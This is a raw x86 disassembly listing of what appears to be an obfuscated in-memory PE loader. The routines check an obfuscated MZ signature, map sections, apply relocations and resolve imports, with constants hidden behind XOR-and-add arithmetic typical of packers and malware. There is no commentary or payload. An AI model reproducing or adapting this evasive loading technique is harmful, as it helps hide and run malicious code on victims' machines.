  41e791:	add    eax,DWORD PTR [ebp+0x8]
  41e794:	mov    ecx,DWORD PTR [eax+0x1c]
  41e797:	mov    edx,DWORD PTR [eax+0x24]
  41e79a:	mov    esi,DWORD PTR [eax+0x14]
  41e79d:	mov    edi,DWORD PTR [eax+0x18]
  41e7a0:	add    ecx,DWORD PTR [ebp+0x8]
  41e7a3:	add    edx,DWORD PTR [ebp+0x8]
  41e7a6:	mov    DWORD PTR [ebp-0x4],esi
  41e7a9:	cmp    esi,edi
  41e7ab:	ja     0x41e7b0
  41e7ad:	mov    DWORD PTR [ebp-0x4],edi
  41e7b0:	mov    DWORD PTR [ebp-0x8],ebx
  41e7b3:	cmp    DWORD PTR [ebp-0x4],ebx
  41e7b6:	jbe    0x41e789
  41e7b8:	cmp    ebx,DWORD PTR [eax+0x14]
  41e7bb:	jae    0x41e7c3
  41e7bd:	movzx  esi,WORD PTR [edx+ebx*2]
  41e7c1:	jmp    0x41e7c5
  41e7c3:	mov    esi,ebx
  41e7c5:	lea    esi,[ecx+esi*4]
  41e7c8:	mov    edi,DWORD PTR [esi]
  41e7ca:	test   edi,edi
  41e7cc:	je     0x41e7f7
  41e7ce:	add    edi,DWORD PTR [ebp+0x8]
  41e7d1:	mov    DWORD PTR [ebp-0x10],edi
  41e7d4:	cmp    edi,eax
  41e7d6:	jbe    0x41e7e8
  41e7d8:	mov    ebx,DWORD PTR [ebp+0xc]
  41e7db:	mov    ebx,DWORD PTR [ebx+0x7c]
  41e7de:	add    ebx,eax
  41e7e0:	cmp    edi,ebx
  41e7e2:	jae    0x41e7e8
  41e7e4:	mov    esi,DWORD PTR [esi]
  41e7e6:	jmp    0x41e7f0
  41e7e8:	sub    edi,DWORD PTR [ebp+0x8]
  41e7eb:	mov    DWORD PTR [esi],edi
  41e7ed:	mov    esi,DWORD PTR [ebp-0x10]
  41e7f0:	test   esi,esi
  41e7f2:	je     0x41e802
  41e7f4:	mov    ebx,DWORD PTR [ebp-0x8]
  41e7f7:	inc    ebx
  41e7f8:	mov    DWORD PTR [ebp-0x8],ebx
  41e7fb:	cmp    ebx,DWORD PTR [ebp-0x4]
  41e7fe:	jb     0x41e7b8
  41e800:	jmp    0x41e789
  41e802:	xor    eax,eax
  41e804:	pop    edi
  41e805:	pop    esi
  41e806:	pop    ebx
  41e807:	leave  
  41e808:	ret    0x8
  41e80b:	push   ebp
  41e80c:	mov    ebp,esp
  41e80e:	sub    esp,0x2c
  41e811:	mov    edx,0xf89c8585
  41e816:	mov    DWORD PTR [ebp-0x4],edx
  41e819:	mov    DWORD PTR [ebp-0x8],0xf89c8584
  41e820:	mov    eax,DWORD PTR [ebp-0x4]
  41e823:	mov    ecx,DWORD PTR [ebp-0x4]
  41e826:	mov    ecx,DWORD PTR [ebp-0x4]
  41e829:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82c:	mov    ecx,DWORD PTR [ebp-0x4]
  41e82f:	mov    ecx,DWORD PTR [ebp-0x4]
  41e832:	push   ebx
  41e833:	mov    ebx,DWORD PTR [ebp+0x10]
  41e836:	push   esi
  41e837:	mov    esi,0x751089b
  41e83c:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  41e843:	mov    ecx,DWORD PTR [ebp-0x4]
  41e846:	mov    ebx,DWORD PTR [ebx+0x190]
  41e84c:	push   edi
  41e84d:	mov    edi,0x3272e2
  41e852:	xor    ecx,esi
  41e854:	xor    eax,esi
  41e856:	add    eax,edi
  41e858:	add    ecx,edi
  41e85a:	mov    DWORD PTR [ebp-0x18],eax
  41e85d:	cmp    ecx,DWORD PTR [ebx]
  41e85f:	je     0x41eae0
  41e865:	mov    ebx,DWORD PTR [ebp-0x4]
  41e868:	mov    ecx,DWORD PTR [ebp+0xc]
  41e86b:	xor    ebx,esi
  41e86d:	add    ebx,edi
  41e86f:	cmp    ebx,ecx
  41e871:	je     0x41eae0
  41e877:	mov    ebx,DWORD PTR [ebp-0x4]
  41e87a:	mov    ecx,DWORD PTR [ecx+0x80]
  41e880:	xor    ebx,esi
  41e882:	add    ebx,edi
  41e884:	cmp    ecx,ebx
  41e886:	je     0x41eadb
  41e88c:	add    ecx,DWORD PTR [ebp+0x8]
  41e88f:	mov    DWORD PTR [ebp-0x2c],ecx
  41e892:	mov    ebx,edx
  41e894:	xor    ebx,esi
  41e896:	add    ebx,edi
  41e898:	mov    DWORD PTR [ebp-0x10],ebx
  41e89b:	mov    ebx,DWORD PTR [ebp-0x10]
  41e89e:	cmp    ebx,edx
  41e8a0:	je     0x41e8b4
  41e8a2:	mov    edx,DWORD PTR [ebp-0x10]
  41e8a5:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8a8:	imul   edx,edx,0x14
  41e8ab:	xor    ebx,esi
  41e8ad:	add    ebx,edi
  41e8af:	cmp    DWORD PTR [edx+ecx*1],ebx
  41e8b2:	jne    0x41e8cb
  41e8b4:	mov    edx,DWORD PTR [ebp-0x10]
  41e8b7:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8ba:	imul   edx,edx,0x14
  41e8bd:	xor    ebx,esi
  41e8bf:	add    ebx,edi
  41e8c1:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  41e8c5:	je     0x41eacd
  41e8cb:	mov    eax,DWORD PTR [ebp-0x4]
  41e8ce:	mov    ebx,DWORD PTR [ebp-0x4]
  41e8d1:	mov    eax,DWORD PTR [ebp-0x10]
  41e8d4:	imul   eax,eax,0x14
  41e8d7:	add    eax,ecx
  41e8d9:	mov    ecx,DWORD PTR [eax+0x10]
  41e8dc:	add    ecx,DWORD PTR [ebp+0x8]
  41e8df:	xor    ebx,esi
  41e8e1:	mov    DWORD PTR [ebp-0x1c],ecx
  41e8e4:	mov    ecx,DWORD PTR [ebp-0x4]
  41e8e7:	mov    edx,DWORD PTR [ebp-0x4]
  41e8ea:	xor    ecx,esi
  41e8ec:	add    ecx,edi
  41e8ee:	xor    edx,esi
  41e8f0:	mov    DWORD PTR [ebp-0x24],ecx
  41e8f3:	mov    ecx,DWORD PTR [eax]
  41e8f5:	add    edx,edi
  41e8f7:	add    ebx,edi
  41e8f9:	cmp    ecx,edx
  41e8fb:	je     0x41e903
  41e8fd:	add    ecx,DWORD PTR [ebp+0x8]
  41e900:	mov    DWORD PTR [ebp-0x24],ecx
  41e903:	mov    ecx,DWORD PTR [ebp-0x4]
  41e906:	xor    ecx,esi
  41e908:	add    ecx,DWORD PTR [eax+0xc]
  41e90b:	mov    eax,DWORD PTR [ebp+0x8]
  41e90e:	lea    eax,[ecx+eax*1+0x3272e2]
  41e915:	mov    DWORD PTR [ebp+0xc],eax
  41e918:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  41e91f:	mov    eax,DWORD PTR [ebp+0x10]
  41e922:	push   DWORD PTR [ebp+0xc]
  41e925:	mov    eax,DWORD PTR [eax+0x1d8]
  41e92b:	call   DWORD PTR [eax]
  41e92d:	mov    ecx,DWORD PTR [ebp-0x4]
  41e930:	xor    ecx,esi
  41e932:	add    ecx,edi
  41e934:	mov    DWORD PTR [ebp-0xc],eax
  41e937:	cmp    ecx,eax
  41e939:	jne    0x41e94d
  41e93b:	mov    eax,DWORD PTR [ebp+0x10]
  41e93e:	push   DWORD PTR [ebp+0xc]
  41e941:	mov    eax,DWORD PTR [eax+0x1d8]
  41e947:	call   DWORD PTR [eax+0xc]
  41e94a:	mov    DWORD PTR [ebp-0xc],eax
  41e94d:	mov    DWORD PTR [ebp-0x20],0x7f661b0c
  41e954:	mov    DWORD PTR [ebp-0x20],0xf89c999c
  41e95b:	mov    eax,DWORD PTR [ebp-0x4]
  41e95e:	xor    eax,esi
  41e960:	add    eax,edi
  41e962:	cmp    eax,DWORD PTR [ebp-0xc]
  41e965:	jne    0x41e98a
  41e967:	mov    eax,DWORD PTR [ebp-0x8]
  41e96a:	mov    ecx,DWORD PTR [ebp-0x20]
  41e96d:	xor    eax,esi
  41e96f:	xor    ecx,esi
  41e971:	lea    ebx,[ebx+eax*1+0x3272e2]
  41e978:	mov    eax,DWORD PTR [ebp+0x10]
  41e97b:	mov    eax,DWORD PTR [eax+0x1d8]
  41e981:	add    ecx,edi
  41e983:	imul   ecx,ebx
  41e986:	push   ecx
  41e987:	call   DWORD PTR [eax+0x24]
  41e98a:	mov    eax,DWORD PTR [ebp-0x4]
  41e98d:	xor    eax,esi
  41e98f:	add    eax,edi
  41e991:	cmp    eax,DWORD PTR [ebp-0xc]
  41e994:	jne    0x41e9a5
  41e996:	mov    eax,DWORD PTR [ebp-0x28]
  41e999:	xor    eax,esi
  41e99b:	add    eax,edi
  41e99d:	cmp    ebx,eax
  41e99f:	jbe    0x41e91f
  41e9a5:	mov    eax,DWORD PTR [ebp-0x4]
  41e9a8:	xor    eax,esi
  41e9aa:	add    eax,edi
  41e9ac:	cmp    eax,DWORD PTR [ebp-0xc]
  41e9af:	jne    0x41e9c8
  41e9b1:	mov    eax,DWORD PTR [ebp-0x8]
  41e9b4:	mov    ecx,DWORD PTR [ebp-0x18]
  41e9b7:	xor    eax,esi
  41e9b9:	lea    eax,[ecx+eax*1+0x3272e2]
  41e9c0:	mov    DWORD PTR [ebp-0x18],eax
  41e9c3:	jmp    0x41eab7
  41e9c8:	mov    DWORD PTR [ebp-0x14],0x1121b0d
  41e9cf:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  41e9d6:	mov    ebx,DWORD PTR [ebp-0x4]
  41e9d9:	xor    ebx,esi
  41e9db:	add    ebx,edi
  41e9dd:	jmp    0x41eaa4
  41e9e2:	mov    eax,DWORD PTR [ebp-0x4]
  41e9e5:	xor    eax,esi
  41e9e7:	add    eax,edi
  41e9e9:	mov    DWORD PTR [ebp-0x14],eax
  41e9ec:	mov    eax,DWORD PTR [ebp-0x4]
  41e9ef:	xor    eax,esi
  41e9f1:	add    eax,edi
  41e9f3:	mov    DWORD PTR [ebp+0xc],eax
  41e9f6:	mov    ecx,DWORD PTR [ebp-0x4]
  41e9f9:	mov    eax,DWORD PTR [ebp-0x24]
  41e9fc:	xor    ecx,esi
  41e9fe:	add    ecx,edi
  41ea00:	cmp    ecx,eax
  41ea02:	je     0x41ea0a
  41ea04:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea07:	mov    DWORD PTR [ebp-0x14],eax
  41ea0a:	mov    eax,DWORD PTR [ebp-0x1c]
  41ea0d:	mov    eax,DWORD PTR [eax+ebx*4]
  41ea10:	mov    DWORD PTR [ebp+0xc],eax
  41ea13:	mov    eax,DWORD PTR [ebp-0x4]
  41ea16:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea19:	xor    eax,esi
  41ea1b:	add    eax,edi
  41ea1d:	cmp    eax,ecx
  41ea1f:	je     0x41ea4a
  41ea21:	mov    eax,DWORD PTR [ebp-0x4]
  41ea24:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea27:	xor    eax,esi
  41ea29:	add    eax,edi
  41ea2b:	shr    ecx,0x1f
  41ea2e:	cmp    eax,ecx
  41ea30:	je     0x41ea4a
  41ea32:	mov    ecx,DWORD PTR [ebp-0x14]
  41ea35:	mov    eax,DWORD PTR [ebp+0x10]
  41ea38:	mov    eax,DWORD PTR [eax+0x1d8]
  41ea3e:	movzx  ecx,cx
  41ea41:	push   ecx
  41ea42:	push   DWORD PTR [ebp-0xc]
  41ea45:	call   DWORD PTR [eax+0x8]
  41ea48:	jmp    0x41ea63
  41ea4a:	mov    eax,DWORD PTR [ebp+0xc]
  41ea4d:	add    eax,DWORD PTR [ebp+0x8]
  41ea50:	mov    ecx,DWORD PTR [ebp+0x10]
  41ea53:	mov    ecx,DWORD PTR [ecx+0x1d8]
  41ea59:	add    eax,0x2
  41ea5c:	push   eax
  41ea5d:	push   DWORD PTR [ebp-0xc]
  41ea60:	call   DWORD PTR [ecx+0x8]
  41ea63:	mov    DWORD PTR [ebp+0xc],eax
  41ea66:	mov    eax,DWORD PTR [ebp-0x4]
  41ea69:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea6c:	xor    eax,esi
  41ea6e:	add    eax,edi
  41ea70:	cmp    eax,ecx
  41ea72:	mov    eax,DWORD PTR [ebp-0x8]
  41ea75:	jne    0x41ea88
  41ea77:	mov    ecx,DWORD PTR [ebp-0x18]
  41ea7a:	xor    eax,esi
  41ea7c:	lea    eax,[ecx+eax*1+0x3272e2]
  41ea83:	mov    DWORD PTR [ebp-0x18],eax
  41ea86:	jmp    0x41ea98
  41ea88:	mov    ecx,DWORD PTR [ebp+0xc]
  41ea8b:	xor    eax,esi
  41ea8d:	add    eax,edi
  41ea8f:	imul   eax,ecx
  41ea92:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ea95:	mov    DWORD PTR [ecx+ebx*4],eax
  41ea98:	mov    eax,DWORD PTR [ebp-0x8]
  41ea9b:	xor    eax,esi
  41ea9d:	lea    ebx,[ebx+eax*1+0x3272e2]
  41eaa4:	mov    eax,DWORD PTR [ebp-0x4]
  41eaa7:	mov    ecx,DWORD PTR [ebp-0x1c]
  41eaaa:	xor    eax,esi
  41eaac:	add    eax,edi
  41eaae:	cmp    DWORD PTR [ecx+ebx*4],eax
  41eab1:	jne    0x41e9e2
  41eab7:	mov    edx,DWORD PTR [ebp-0x10]
  41eaba:	mov    eax,DWORD PTR [ebp-0x18]
  41eabd:	mov    ecx,DWORD PTR [ebp-0x2c]
  41eac0:	sub    edx,0x3272e1
  41eac6:	xor    edx,esi
  41eac8:	jmp    0x41e892
  41eacd:	mov    ecx,DWORD PTR [ebp-0x4]
  41ead0:	xor    ecx,esi
  41ead2:	add    ecx,edi
  41ead4:	cmp    eax,ecx
  41ead6:	mov    eax,DWORD PTR [ebp-0x4]
  41ead9:	jne    0x41eae3
  41eadb:	mov    eax,DWORD PTR [ebp-0x8]
  41eade:	jmp    0x41eae3
  41eae0:	mov    eax,DWORD PTR [ebp-0x4]
  41eae3:	xor    eax,esi
  41eae5:	add    eax,edi
  41eae7:	pop    edi
  41eae8:	pop    esi
  41eae9:	pop    ebx
  41eaea:	leave  
  41eaeb:	ret    0xc
  41eaee:	push   ebp
  41eaef:	mov    ebp,esp
  41eaf1:	sub    esp,0x28
  41eaf4:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41eafb:	mov    DWORD PTR [ebp-0x28],0xf89c8584
  41eb02:	mov    eax,DWORD PTR [ebp+0xc]
  41eb05:	mov    DWORD PTR [ebp+0xc],eax
  41eb08:	push   esi
  41eb09:	mov    eax,eax
  41eb0b:	mov    eax,DWORD PTR [ebp-0x4]
  41eb0e:	mov    esi,DWORD PTR [ebp+0x8]
  41eb11:	mov    ecx,0x751089b
  41eb16:	xor    eax,ecx
  41eb18:	mov    edx,0x3272e2
  41eb1d:	add    eax,edx
  41eb1f:	cmp    esi,eax
  41eb21:	je     0x41ec48
  41eb27:	mov    eax,DWORD PTR [ebp+0x8]
  41eb2a:	mov    esi,DWORD PTR [ebp+0x8]
  41eb2d:	add    esi,DWORD PTR [eax+0x3c]
  41eb30:	push   edi
  41eb31:	mov    DWORD PTR [ebp+0xc],esi
  41eb34:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  41eb3b:	mov    eax,DWORD PTR [ebp-0x1c]
  41eb3e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb41:	mov    edi,DWORD PTR [ebp+0xc]
  41eb44:	xor    esi,ecx
  41eb46:	xor    eax,ecx
  41eb48:	add    esi,edx
  41eb4a:	cmp    DWORD PTR [edi+eax*8+0x1939788],esi
  41eb51:	je     0x41ec42
  41eb57:	mov    esi,DWORD PTR [ebp+0xc]
  41eb5a:	mov    eax,DWORD PTR [ebp+0x8]
  41eb5d:	add    eax,DWORD PTR [esi+0xa0]
  41eb63:	mov    esi,DWORD PTR [ebp+0x8]
  41eb66:	mov    edi,DWORD PTR [ebp+0xc]
  41eb69:	sub    esi,DWORD PTR [edi+0x34]
  41eb6c:	mov    edi,DWORD PTR [ebp-0x4]
  41eb6f:	xor    edi,ecx
  41eb71:	add    edi,edx
  41eb73:	mov    DWORD PTR [ebp-0x24],esi
  41eb76:	cmp    esi,edi
  41eb78:	je     0x41ec42
  41eb7e:	mov    esi,DWORD PTR [ebp-0x4]
  41eb81:	xor    esi,ecx
  41eb83:	add    esi,edx
  41eb85:	mov    DWORD PTR [ebp-0x8],esi
  41eb88:	push   ebx
  41eb89:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  41eb90:	jmp    0x41ec2c
  41eb95:	mov    esi,DWORD PTR [ebp-0x4]
  41eb98:	xor    esi,ecx
  41eb9a:	lea    edi,[ebx-0x8]
  41eb9d:	add    esi,edx
  41eb9f:	shr    edi,1
  41eba1:	cmp    esi,edi
  41eba3:	jae    0x41ec12
  41eba5:	sub    edi,esi
  41eba7:	lea    ebx,[eax+esi*2+0x8]
  41ebab:	mov    DWORD PTR [ebp-0x18],edi
  41ebae:	movzx  esi,WORD PTR [ebx]
  41ebb1:	and    esi,0xfff
  41ebb7:	mov    DWORD PTR [ebp-0x14],esi
  41ebba:	mov    edi,DWORD PTR [ebp-0x14]
  41ebbd:	mov    esi,DWORD PTR [eax]
  41ebbf:	sub    esi,edx
  41ebc1:	add    edi,esi
  41ebc3:	movzx  esi,WORD PTR [ebx]
  41ebc6:	shr    esi,0xc
  41ebc9:	xor    edi,ecx
  41ebcb:	mov    DWORD PTR [ebp-0x20],edi
  41ebce:	mov    DWORD PTR [ebp-0x14],esi
  41ebd1:	mov    esi,DWORD PTR [ebp-0x20]
  41ebd4:	mov    edi,DWORD PTR [ebp+0x8]
  41ebd7:	xor    esi,ecx
  41ebd9:	lea    esi,[esi+edi*1+0x3272e2]
  41ebe0:	mov    DWORD PTR [ebp-0x20],esi
  41ebe3:	mov    esi,DWORD PTR [ebp-0x10]
  41ebe6:	mov    edi,DWORD PTR [ebp-0x14]
  41ebe9:	xor    esi,ecx
  41ebeb:	add    esi,edx
  41ebed:	cmp    edi,esi
  41ebef:	jne    0x41ec07
  41ebf1:	mov    esi,DWORD PTR [ebp-0x10]
  41ebf4:	mov    edi,DWORD PTR [ebp-0x14]
  41ebf7:	xor    esi,ecx
  41ebf9:	add    esi,edx
  41ebfb:	cmp    edi,esi
  41ebfd:	jne    0x41ec07
  41ebff:	mov    esi,DWORD PTR [ebp-0x20]
  41ec02:	mov    edi,DWORD PTR [ebp-0x24]
  41ec05:	add    DWORD PTR [esi],edi
  41ec07:	add    ebx,0x2
  41ec0a:	dec    DWORD PTR [ebp-0x18]
  41ec0d:	jne    0x41ebae
  41ec0f:	mov    ebx,DWORD PTR [ebp-0xc]
  41ec12:	add    DWORD PTR [ebp-0x8],ebx
  41ec15:	mov    esi,DWORD PTR [ebp-0x1c]
  41ec18:	mov    edi,DWORD PTR [ebp-0x8]
  41ec1b:	mov    ebx,DWORD PTR [ebp+0xc]
  41ec1e:	xor    esi,ecx
  41ec20:	cmp    edi,DWORD PTR [ebx+esi*8+0x193978c]
  41ec27:	jae    0x41ec41
  41ec29:	add    eax,DWORD PTR [ebp-0xc]
  41ec2c:	mov    esi,DWORD PTR [ebp-0x4]
  41ec2f:	mov    ebx,DWORD PTR [eax+0x4]
  41ec32:	xor    esi,ecx
  41ec34:	add    esi,edx
  41ec36:	mov    DWORD PTR [ebp-0xc],ebx
  41ec39:	cmp    ebx,esi
  41ec3b:	jne    0x41eb95
  41ec41:	pop    ebx
  41ec42:	mov    eax,DWORD PTR [ebp-0x28]
  41ec45:	pop    edi
  41ec46:	jmp    0x41ec4b
  41ec48:	mov    eax,DWORD PTR [ebp-0x4]
  41ec4b:	xor    eax,ecx
  41ec4d:	add    eax,edx
  41ec4f:	pop    esi
  41ec50:	leave  
  41ec51:	ret    0x8
  41ec54:	push   ebp
  41ec55:	mov    ebp,esp
  41ec57:	sub    esp,0xcc
  41ec5d:	mov    DWORD PTR [ebp-0x4],0xf89c8585
  41ec64:	mov    DWORD PTR [ebp-0x24],0xf89c8584
  41ec6b:	mov    eax,DWORD PTR [ebp-0x4]
  41ec6e:	push   ebx
  41ec6f:	push   esi
  41ec70:	mov    esi,0x751089b
  41ec75:	xor    eax,esi
  41ec77:	push   edi
  41ec78:	mov    edi,0x3272e2
  41ec7d:	add    eax,edi
  41ec7f:	mov    DWORD PTR [ebp-0x1c],eax
  41ec82:	mov    eax,DWORD PTR [ebp-0x4]
  41ec85:	xor    eax,esi
  41ec87:	add    eax,edi
  41ec89:	mov    DWORD PTR [ebp-0x8],eax
  41ec8c:	mov    ebx,DWORD PTR [ebp+0x20]
  41ec8f:	mov    eax,DWORD PTR [ebp-0x14]
  41ec92:	mov    ecx,DWORD PTR [ebp-0x14]
  41ec95:	xor    eax,ecx
  41ec97:	mov    DWORD PTR [ebp-0x14],eax
  41ec9a:	add    DWORD PTR [ebp-0x14],0xf89cb585
  41eca1:	mov    eax,DWORD PTR [ebp-0xc]
  41eca4:	mov    ecx,DWORD PTR [ebp-0xc]
  41eca7:	xor    eax,ecx
  41eca9:	mov    DWORD PTR [ebp-0xc],eax
  41ecac:	add    DWORD PTR [ebp-0xc],0xf89c85c5
  41ecb3:	mov    eax,DWORD PTR [ebp-0x10]
  41ecb6:	mov    ecx,DWORD PTR [ebp-0x10]
  41ecb9:	xor    eax,ecx
  41ecbb:	mov    DWORD PTR [ebp-0x10],eax
  41ecbe:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  41ecc5:	mov    eax,DWORD PTR [ebp-0x20]
  41ecc8:	mov    ecx,DWORD PTR [ebp-0x20]
  41eccb:	xor    eax,ecx
  41eccd:	mov    DWORD PTR [ebp-0x20],eax
  41ecd0:	add    DWORD PTR [ebp-0x20],0xf89f0585
  41ecd7:	mov    eax,0x9471
  41ecdc:	mov    WORD PTR [ebp+0x20],ax
  41ece0:	mov    eax,DWORD PTR [ebp+0x8]
  41ece3:	test   eax,eax
  41ece5:	je     0x41f140
  41eceb:	mov    eax,DWORD PTR [ebp+0xc]
  41ecee:	test   eax,eax
  41ecf0:	je     0x41f140
  41ecf6:	mov    eax,DWORD PTR [ebp+0x18]
  41ecf9:	test   eax,eax
  41ecfb:	je     0x41f140
  41ed01:	mov    ax,WORD PTR [ebp+0x20]
  41ed05:	mov    ecx,0x8a8d
  41ed0a:	xor    ax,cx
  41ed0d:	mov    ecx,0x3b51
  41ed12:	add    ax,cx
  41ed15:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed18:	cmp    WORD PTR [ecx],ax
  41ed1b:	jne    0x41f140
  41ed21:	mov    eax,DWORD PTR [ebp-0x4]
  41ed24:	xor    eax,esi
  41ed26:	add    eax,edi
  41ed28:	mov    DWORD PTR [ebp-0x30],eax
  41ed2b:	mov    eax,DWORD PTR [ebp-0x4]
  41ed2e:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed31:	mov    eax,DWORD PTR [ebp+0x8]
  41ed34:	add    eax,DWORD PTR [ecx+0x3c]
  41ed37:	mov    DWORD PTR [ebp+0xc],eax
  41ed3a:	mov    eax,DWORD PTR [eax+0x50]
  41ed3d:	test   eax,eax
  41ed3f:	je     0x41f140
  41ed45:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  41ed4c:	mov    eax,DWORD PTR [ebp-0x2c]
  41ed4f:	xor    eax,esi
  41ed51:	add    eax,edi
  41ed53:	mov    DWORD PTR [ebp-0x2c],eax
  41ed56:	mov    eax,DWORD PTR [ebp-0x4]
  41ed59:	mov    eax,DWORD PTR [ebx+0x190]
  41ed5f:	mov    ecx,DWORD PTR [eax]
  41ed61:	mov    ecx,DWORD PTR [ecx+0x3c]
  41ed64:	add    ecx,DWORD PTR [eax]
  41ed66:	mov    eax,DWORD PTR [ebp-0x4]
  41ed69:	mov    eax,DWORD PTR [ebx+0x18c]
  41ed6f:	mov    edx,DWORD PTR [eax]
  41ed71:	mov    DWORD PTR [ebp-0x18],ecx
  41ed74:	mov    DWORD PTR [ebp+0x20],edx
  41ed77:	cmp    edx,edx
  41ed79:	jne    0x41edad
  41ed7b:	mov    eax,DWORD PTR [ebx+0x1d8]
  41ed81:	lea    edx,[ebp-0x1c]
  41ed84:	push   edx
  41ed85:	mov    edx,DWORD PTR [ebp-0xc]
  41ed88:	xor    edx,esi
  41ed8a:	add    edx,edi
  41ed8c:	push   edx
  41ed8d:	push   DWORD PTR [ecx+0x50]
  41ed90:	push   DWORD PTR [ebp+0x20]
  41ed93:	call   DWORD PTR [eax+0x1c]
  41ed96:	mov    eax,DWORD PTR [ebp-0x18]
  41ed99:	mov    ecx,DWORD PTR [eax+0x54]
  41ed9c:	mov    eax,DWORD PTR [eax+0x50]
  41ed9f:	sub    eax,ecx
  41eda1:	add    ecx,DWORD PTR [ebp+0x20]
  41eda4:	push   ecx
  41eda5:	call   0x41f72c
  41edaa:	mov    edx,DWORD PTR [ebp+0x20]
  41edad:	mov    eax,DWORD PTR [ebx+0x194]
  41edb3:	mov    DWORD PTR [eax],edx
  41edb5:	mov    eax,DWORD PTR [ebp+0xc]
  41edb8:	push   DWORD PTR [eax+0x54]
  41edbb:	push   DWORD PTR [ebp+0x8]
  41edbe:	push   edx
  41edbf:	call   0x41f5d3
  41edc4:	mov    ecx,DWORD PTR [ebp+0x20]
  41edc7:	mov    eax,DWORD PTR [ecx+0x3c]
  41edca:	add    eax,ecx
  41edcc:	movzx  ecx,WORD PTR [eax+0x14]
  41edd0:	lea    ecx,[ecx+eax*1+0x18]
  41edd4:	mov    DWORD PTR [ebp+0x18],ecx
  41edd7:	mov    ecx,DWORD PTR [ebp-0x4]
  41edda:	movzx  edx,WORD PTR [eax+0x6]
  41edde:	xor    ecx,esi
  41ede0:	add    ecx,edi
  41ede2:	mov    DWORD PTR [ebp+0xc],eax
  41ede5:	cmp    edx,ecx
  41ede7:	je     0x41ee94
  41eded:	mov    ecx,DWORD PTR [ebp-0x4]
  41edf0:	xor    ecx,esi
  41edf2:	add    ecx,edi
  41edf4:	mov    DWORD PTR [ebp-0x8],ecx
  41edf7:	mov    ecx,DWORD PTR [ebp-0x24]
  41edfa:	movzx  edx,WORD PTR [eax+0x6]
  41edfe:	xor    ecx,esi
  41ee00:	sub    edx,ecx
  41ee02:	sub    edx,edi
  41ee04:	cmp    DWORD PTR [ebp-0x8],edx
  41ee07:	ja     0x41ee94
  41ee0d:	mov    edx,DWORD PTR [ebp+0x18]
  41ee10:	add    edx,0x8
  41ee13:	mov    DWORD PTR [ebp+0x18],edx
  41ee16:	jmp    0x41ee1b
  41ee18:	mov    edx,DWORD PTR [ebp+0x18]
  41ee1b:	mov    eax,DWORD PTR [eax+0x38]
  41ee1e:	lea    ecx,[eax-0x1]
  41ee21:	mov    DWORD PTR [ebp-0x34],eax
  41ee24:	mov    eax,DWORD PTR [edx]
  41ee26:	test   ecx,eax
  41ee28:	je     0x41ee31
  41ee2a:	not    ecx
  41ee2c:	and    eax,ecx
  41ee2e:	add    eax,DWORD PTR [ebp-0x34]
  41ee31:	mov    ecx,DWORD PTR [edx+0x4]
  41ee34:	add    ecx,DWORD PTR [ebp+0x20]
  41ee37:	push   ecx
  41ee38:	call   0x41f72c
  41ee3d:	mov    edx,DWORD PTR [ebp-0x4]
  41ee40:	mov    eax,DWORD PTR [ebp+0x18]
  41ee43:	mov    ecx,DWORD PTR [eax+0x8]
  41ee46:	xor    edx,esi
  41ee48:	add    edx,edi
  41ee4a:	cmp    ecx,edx
  41ee4c:	je     0x41ee65
  41ee4e:	push   ecx
  41ee4f:	mov    ecx,DWORD PTR [ebp+0x8]
  41ee52:	add    ecx,DWORD PTR [eax+0xc]
  41ee55:	mov    eax,DWORD PTR [eax+0x4]
  41ee58:	add    eax,DWORD PTR [ebp+0x20]
  41ee5b:	push   ecx
  41ee5c:	push   eax
  41ee5d:	call   0x41f5d3
  41ee62:	mov    eax,DWORD PTR [ebp+0x18]
  41ee65:	mov    ecx,DWORD PTR [ebp-0x24]
  41ee68:	mov    edx,DWORD PTR [ebp-0x8]
  41ee6b:	add    eax,0x28
  41ee6e:	xor    ecx,esi
  41ee70:	lea    ecx,[edx+ecx*1+0x3272e2]
  41ee77:	mov    edx,DWORD PTR [ebp+0xc]
  41ee7a:	mov    DWORD PTR [ebp+0x18],eax
  41ee7d:	mov    eax,DWORD PTR [ebp-0x24]
  41ee80:	movzx  edx,WORD PTR [edx+0x6]
  41ee84:	xor    eax,esi
  41ee86:	sub    edx,eax
  41ee88:	mov    eax,DWORD PTR [ebp+0xc]
  41ee8b:	sub    edx,edi
  41ee8d:	mov    DWORD PTR [ebp-0x8],ecx
  41ee90:	cmp    ecx,edx
  41ee92:	jbe    0x41ee18
  41ee94:	mov    edx,DWORD PTR [ebx+0x18c]
  41ee9a:	mov    ecx,DWORD PTR [ebp+0x20]
  41ee9d:	cmp    ecx,DWORD PTR [edx]
  41ee9f:	jne    0x41eec8
  41eea1:	mov    eax,DWORD PTR [ebx+0x1d8]
  41eea7:	lea    edx,[ebp-0x1c]
  41eeaa:	push   edx
  41eeab:	mov    edx,DWORD PTR [ebp-0x10]
  41eeae:	xor    edx,esi
  41eeb0:	add    edx,edi
  41eeb2:	push   edx
  41eeb3:	mov    edx,DWORD PTR [ebp-0x18]
  41eeb6:	push   DWORD PTR [edx+0x54]
  41eeb9:	push   ecx
  41eeba:	call   DWORD PTR [eax+0x1c]
  41eebd:	test   eax,eax
  41eebf:	je     0x41f131
  41eec5:	mov    eax,DWORD PTR [ebp+0xc]
  41eec8:	mov    ecx,DWORD PTR [ebx+0x1c8]
  41eece:	mov    ecx,DWORD PTR [ecx]
  41eed0:	xor    ecx,esi
  41eed2:	add    ecx,edi
  41eed4:	je     0x41f05c
  41eeda:	and    DWORD PTR [ebp-0x28],0x0
  41eede:	and    DWORD PTR [ebp+0x8],0x0
  41eee2:	mov    eax,0xf89c8519
